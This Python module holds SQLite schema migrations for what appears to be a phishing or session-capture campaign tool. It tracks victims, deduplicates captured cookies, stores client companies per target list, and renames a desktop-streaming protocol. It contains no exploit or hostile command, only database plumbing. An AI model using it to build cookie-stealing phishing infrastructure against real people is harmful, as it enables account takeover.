"""Ordered, idempotent migrations for existing SQLite databases."""

from collections.abc import Callable
import json

from sqlalchemy import inspect, text
from sqlalchemy.engine import Connection, Engine


Migration = tuple[str, Callable[[Connection], None]]


def _add_captured_cookie_deduplication(connection: Connection) -> None:
    """Create the cookie identity index and seed it from existing events."""
    connection.execute(
        text(
            """
            CREATE TABLE IF NOT EXISTS captured_cookies (
                victim_id VARCHAR NOT NULL,
                fingerprint VARCHAR(64) NOT NULL,
                first_seen_at DATETIME NOT NULL DEFAULT CURRENT_TIMESTAMP,
                PRIMARY KEY (victim_id, fingerprint),
                FOREIGN KEY(victim_id) REFERENCES victims(id) ON DELETE CASCADE
            )
            """
        )
    )

    inspector = inspect(connection)
    if not inspector.has_table("victim_events"):
        return

    from utils.cookie_capture import cookie_fingerprint, iter_captured_cookies

    rows = connection.execute(
        text(
            "SELECT victim_id, payload FROM victim_events "
            "WHERE event_type IN ('COOKIE_CAPTURED', 'cookie_captured')"
        )
    )
    for victim_id, raw_payload in rows:
        try:
            payload = (
                json.loads(raw_payload)
                if isinstance(raw_payload, str)
                else raw_payload
            )
        except (TypeError, ValueError):
            continue
        for cookie in iter_captured_cookies(payload):
            connection.execute(
                text(
                    "INSERT OR IGNORE INTO captured_cookies "
                    "(victim_id, fingerprint) VALUES (:victim_id, :fingerprint)"
                ),
                {
                    "victim_id": victim_id,
                    "fingerprint": cookie_fingerprint(cookie),
                },
            )


def _add_smtp_ignore_cert_errors(connection: Connection) -> None:
    inspector = inspect(connection)
    if not inspector.has_table("sending_profiles"):
        return
    columns = {
        column["name"]
        for column in inspector.get_columns("sending_profiles")
    }
    if "ignore_cert_errors" not in columns:
        connection.execute(
            text(
                "ALTER TABLE sending_profiles "
                "ADD COLUMN ignore_cert_errors BOOLEAN NOT NULL DEFAULT 0"
            )
        )


def _move_target_company_to_target_list(connection: Connection) -> None:
    """`company` is a property of the client org a list targets, not of a
    single contact, so it moves from `targets` (per-row) to `target_lists`
    (per-list). Existing per-target values are folded up into the list."""
    inspector = inspect(connection)
    if not inspector.has_table("target_lists"):
        return
    target_list_columns = {
        column["name"] for column in inspector.get_columns("target_lists")
    }
    if "company" not in target_list_columns:
        connection.execute(
            text("ALTER TABLE target_lists ADD COLUMN company VARCHAR")
        )

        target_columns = (
            {column["name"] for column in inspector.get_columns("targets")}
            if inspector.has_table("targets")
            else set()
        )
        if "company" in target_columns:
            connection.execute(
                text(
                    """
                    UPDATE target_lists
                    SET company = (
                        SELECT t.company
                        FROM targets t
                        WHERE t.target_list_id = target_lists.id
                          AND t.company IS NOT NULL
                          AND t.company != ''
                        LIMIT 1
                    )
                    WHERE EXISTS (
                        SELECT 1 FROM targets t
                        WHERE t.target_list_id = target_lists.id
                          AND t.company IS NOT NULL
                          AND t.company != ''
                    )
                    """
                )
            )


def _add_victim_company(connection: Connection) -> None:
    """Victims already snapshot first/last name off the target at send
    time; company joins that snapshot so template rendering can read it
    without a join back to a list that may have since changed."""
    inspector = inspect(connection)
    if not inspector.has_table("victims"):
        return
    columns = {column["name"] for column in inspector.get_columns("victims")}
    if "company" not in columns:
        connection.execute(
            text("ALTER TABLE victims ADD COLUMN company VARCHAR")
        )
        if inspector.has_table("campaigns") and inspector.has_table("target_lists"):
            connection.execute(
                text(
                    """
                    UPDATE victims
                    SET company = (
                        SELECT tl.company
                        FROM campaigns c
                        JOIN target_lists tl ON tl.id = c.target_list_id
                        WHERE c.id = victims.campaign_id
                    )
                    WHERE EXISTS (
                        SELECT 1 FROM campaigns c
                        WHERE c.id = victims.campaign_id
                          AND c.target_list_id IS NOT NULL
                    )
                    """
                )
            )


def _rename_webrtc_campaign_protocol(connection: Connection) -> None:
    """Use ``selkies`` as the persisted desktop-streaming protocol name.

    WebRTC remains the webcam signaling protocol; the legacy value described
    the Selkies desktop runtime imprecisely.
    """
    inspector = inspect(connection)
    if not inspector.has_table("campaigns"):
        return
    columns = {column["name"] for column in inspector.get_columns("campaigns")}
    if "protocol" in columns:
        connection.execute(
            text(
                "UPDATE campaigns SET protocol = 'selkies' "
                "WHERE protocol = 'webrtc'"
            )
        )
    if "advanced_options" in columns:
        connection.execute(
            text(
                """
                UPDATE campaigns
                SET advanced_options = json_set(
                    advanced_options,
                    '$.protocol',
                    'selkies'
                )
                WHERE json_valid(advanced_options)
                  AND json_extract(advanced_options, '$.protocol') = 'webrtc'
                """
            )
        )


MIGRATIONS: tuple[Migration, ...] = (
    ("20260729_01_add_smtp_ignore_cert_errors", _add_smtp_ignore_cert_errors),
    (
        "20260731_01_move_target_company_to_target_list",
        _move_target_company_to_target_list,
    ),
    ("20260731_02_add_victim_company", _add_victim_company),
    ("20260801_01_rename_webrtc_protocol", _rename_webrtc_campaign_protocol),
    (
        "20260803_01_add_captured_cookie_deduplication",
        _add_captured_cookie_deduplication,
    ),
)


def apply_schema_migrations(engine: Engine) -> None:
    """Apply each released schema migration exactly once."""
    with engine.begin() as connection:
        connection.execute(
            text(
                """
                CREATE TABLE IF NOT EXISTS schema_migrations (
                    migration_id TEXT PRIMARY KEY,
                    applied_at TEXT NOT NULL DEFAULT CURRENT_TIMESTAMP
                )
                """
            )
        )
        applied = {
            row[0]
            for row in connection.execute(
                text("SELECT migration_id FROM schema_migrations")
            )
        }

        for migration_id, migration in MIGRATIONS:
            if migration_id in applied:
                continue
            migration(connection)
            connection.execute(
                text(
                    "INSERT INTO schema_migrations (migration_id) "
                    "VALUES (:migration_id)"
                ),
                {"migration_id": migration_id},
            )
